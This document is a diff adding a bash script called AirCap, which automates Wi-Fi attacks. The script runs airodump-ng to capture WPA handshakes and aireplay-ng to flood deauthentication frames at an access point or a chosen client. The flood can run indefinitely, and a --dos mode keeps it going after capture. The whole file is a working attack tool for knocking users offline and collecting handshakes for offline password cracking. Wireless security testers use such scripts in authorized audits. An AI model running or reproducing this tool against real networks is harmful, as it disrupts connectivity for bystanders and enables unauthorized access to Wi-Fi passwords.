@@ -1,0 +1,203 @@
+#!/bin/bash
+
+
+########################################################
+# AirCap Tool For Hunting Wpa Handshake and Dos Deauth #
+# Wirtten By 0xCrypt00o                                #
+# https://github.com/Crypt00o/aircap                   #
+########################################################
+
+###################
+
+#Colors
+ORANGE="\e[33m"
+STOP="\e[0m"
+BLACK="\e[90m"
+RED="\e[91m"
+GREEN="\e[92m"
+YELLOW="\e[93m"
+BLUE="\e[94m"
+PURPLE="\e[95m"
+CYAN="\e[96m"
+WHITE="\e[97m"
+#################
+
+
+
+makeargs(){
+POSITIONAL_ARGS=()
+
+while [[ $# -gt 0 ]]; do
+  case $1 in
+    -i|--interface)
+      interface="$2"
+      shift
+      shift
+      ;;
+    -b|--bssid)
+      bssid="$2"
+      shift
+      shift
+      ;;
+    -c|--channel)
+      channel="$2"
+      shift
+      shift
+      ;;
+    -f|--file)
+      filename="$2"
+      shift
+      shift
+      ;;
+    -n|--deauth-count)
+      count="$2"
+      shift
+      shift
+      ;;
+    -C|--client)
+      client="$2"
+      shift
+      shift
+      ;;
+
+    --dos)
+      dos_option=YES
+      shift
+      ;;
+    -*|--*)
+      printf "${RED} Unknown option $1"
+      exit 1
+      ;;
+    *)
+      POSITIONAL_ARGS+=("$1") # save positional arg
+      shift # past argument
+      ;;
+  esac
+done
+
+set -- "${POSITIONAL_ARGS[@]}" # restore positional parameters
+uid=$(id  | cut -d "=" -f 2 | cut -d "(" -f1)
+check_interface=$(iwconfig 2>/dev/null  | grep "$interface ")
+check_interface_monitor=$(iwconfig $interface 2>/dev/null | grep  "Monitor")
+}
+
+
+
+
+usage(){
+printf "${GREEN}\n\n%s\n" "[+] Usage: "
+printf "%s\n" "--interface <wireless interface> , [Needed]"
+printf "%s\n"  "--channel <channel of accesspoint> , [Needed]"
+printf "%s\n" "--bssid <bssid of accesspoint> , [Needed]"
+printf "%s\n" "--deauth-count <number of deauth times , Default=0 mean infinity > , [Optional]"
+printf "%s\n" "--client <client macaddress> , [Optional]"
+printf "%s\n" "--file <filename to write the handshake> , [Optional]"
+printf "%s\n" "--dos  ,this flag mean to make a dos deauth attack & captureing handshake  [Optional]"
+exit
+}
+
+banner(){
+printf "\n\n${GREEN}
+ █████╗ ██╗██████╗      ██████╗ █████╗ ██████╗ 
+██╔══██╗██║██╔══██╗    ██╔════╝██╔══██╗██╔══██╗
+███████║██║██████╔╝    ██║     ███████║██████╔╝
+██╔══██║██║██╔══██╗    ██║     ██╔══██║██╔═══╝ 
+██║  ██║██║██║  ██║    ╚██████╗██║  ██║██║     
+╚═╝  ╚═╝╚═╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝     
+                                               "
+printf "\n${ORANGE}[+] AirCap Tool Made By [ 0xCrypt00o  : 'Eslam Mohamed' ] To Capture WPA Handshake and PMKID "
+printf "\n${ORANGE}[+] github: https://github.com/Crypt00o"
+sleep 3
+
+}
+
+
+finish(){
+if [[ -z $dos_option ]]
+then
+pkill xterm
+mv $filename-01.cap $filename.cap
+printf "\n\n${GREEN}[+] Captured Successfully Saved As $filename.cap"
+exit
+else
+mv $filename-01.cap $filename.cap
+printf "\n\n${GREEN}[+] Captured Successfully Saved As $filename.cap"
+printf "\n\n${Orange}[+] To Stop DOS Deauth Attack Press Enter "
+read stop
+pkill xterm
+exit
+fi
+}
+
+checkargs(){
+if [[ -z $interface ]] || [[ -z $bssid ]] || [[ -z $channel ]]
+then usage
+
+elif [[ $uid -ne 0 ]]
+then printf "\n\n${RED}[-] Please Run As Root !" && exit 
+
+elif [[ -z $check_interface ]]
+then printf "\n\n${RED}[-] Interface Not Found !" && exit
+
+elif [[ -z $check_interface_monitor ]] 
+then printf "\n\n${RED}  [-] Please Put The Interface $interface in Monitor Mode Useing Command \n\n$ airmon-ng start $interface \n\n  And Try Again  !" && exit
+
+else
+    if [[ -z $count ]]
+    then count=0
+    fi
+
+    if [[ -z $filename ]]
+    then filename=aircap_$(date +'%F-%T')
+    fi
+
+    if [[ -e $filename-01.cap ]]
+    then rm -rf $filename-01.cap
+    fi
+
+fi
+}
+
+
+
+verify_handshake(){
+printf "\n\n${ORANGE}[!] Please Wait Until The Handshake Captured and Saved Automaticly ,\n And Every Thing Will Close To Cancel Operation Press CTRL+C "
+while [ true ]
+do
+verify=$(aircrack-ng $filename-01.cap 2>/dev/null | grep -a "handshake" | awk -F " handshake" '{print $1}' | cut -d "(" -f 2 )
+
+if [[ -z  $verify ]]
+ then continue
+else
+
+ if [[ $verify -gt 0 ]]
+ then break
+ else continue
+ fi
+
+fi
+done
+finish
+}
+
+
+aircap(){
+printf "\n\n${GREEN}[+] Starting Dumping And Deauth "
+xterm -e /bin/sh -c "/usr/sbin/airodump-ng $interface --bssid $bssid --channel $channel -w $filename --output-format cap " &
+sleep 2
+
+
+if [[ -z $client ]]
+then
+xterm -e /bin/sh -c  "/usr/sbin/aireplay-ng $interface --deauth $count -a $bssid  " &
+else
+xterm -e /bin/sh -c  "/usr/sbin/aireplay-ng $interface --deauth $count -a $bssid -c $client " &
+fi
+verify_handshake
+}
+
+
+banner
+makeargs $*
+checkargs
+aircap
